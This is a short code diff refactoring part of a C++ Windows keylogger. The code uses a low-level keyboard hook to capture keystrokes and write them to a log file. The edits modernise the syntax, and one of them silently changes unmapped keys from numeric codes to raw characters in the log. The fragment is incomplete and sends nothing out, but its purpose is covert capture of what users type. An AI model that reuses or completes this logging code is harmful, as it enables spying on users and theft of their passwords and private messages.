@@ -51,9 +51,7 @@ void HandleKeyStrokes() {
             FileLogger::Log(*keyStroke);
         }
         else {
-            std::stringstream ss;
-            ss << e->GetCode() << "\\";
-            FileLogger::Log(ss.str());
+            FileLogger::Log(std::string{ static_cast<char>(e->GetCode()) }.append("\\"));
         }
     }
 }
@@ -62,7 +60,7 @@ LRESULT KbdProc(int nCode, WPARAM wParam, LPARAM lParam) noexcept {
     if (nCode < 0)
         CallNextHookEx(g_hook, nCode, wParam, lParam);
 
-    KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+    auto kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
     switch (wParam) {
     case WM_KEYDOWN:
@@ -175,8 +173,7 @@ std::optional<std::string> KeyCodeToString(int keyCode) {
         {VK_OEM_102,                "0xE2\\"}    
     };
 
-    if (codes.find(keyCode) != codes.end()) {
+    if(codes.contains(keyCode))
         return std::string(codes.at(keyCode));
-    }
     return {};
 }
